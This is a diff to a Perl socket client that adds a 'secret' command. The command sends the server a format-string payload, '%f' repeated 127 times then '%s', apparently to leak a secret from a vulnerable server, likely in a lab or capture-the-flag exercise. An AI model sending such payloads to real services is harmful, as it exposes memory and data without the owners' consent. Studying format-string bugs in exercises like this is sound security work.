@@ -10,28 +10,31 @@ $socket = new IO::Socket::INET (
                                )                
 or die "Couldn't connect to Server\n";
 
-        $input = 'perl inputA.pl';
-        $socket->recv($recv_data,1024);
-	print "RECIEVED: $recv_data"; 
-        $socket->send($input);
 
 while (1) {
 	
 	$socket->recv($recv_data,1024);
 	print "RECIEVED: $recv_data"; 
-        print "\nSEND(TYPE quit to Quit):";
+        print "\nSEND(TYPE quit to Quit or TYPE secret to get the secret):";
         
         $send_data = <STDIN>;
         $tmp=$send_data;
 	chop($tmp); # get rid of new line
               
         
-        if ($tmp ne 'quit') {
-	        $socket->send($send_data);
-        }    else {
+        if ($tmp eq 'quit') {
 	        $socket->send($send_data);
             	close $socket;
             	last;
+        }
+	elsif ($tmp eq 'secret') {
+		print "Getting secret...\n";
+		my $secret_1 = "%f";
+		my $secret_2 = ($secret_1 x 127) . "%s test\n";
+		print "$secret_2";
+	        $socket->send($secret_2);
+        }    else {
+	        $socket->send($send_data);
         }
 }    
     
